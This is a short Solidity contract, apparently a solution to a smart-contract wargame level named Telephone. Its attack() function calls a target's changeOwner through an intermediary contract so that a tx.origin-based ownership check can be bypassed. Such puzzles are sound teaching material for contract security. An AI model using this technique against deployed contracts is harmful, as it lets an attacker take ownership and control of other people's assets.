// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneH {
    function attack(address _target) public {
        Telephone(_target).changeOwner(msg.sender);
    }
}
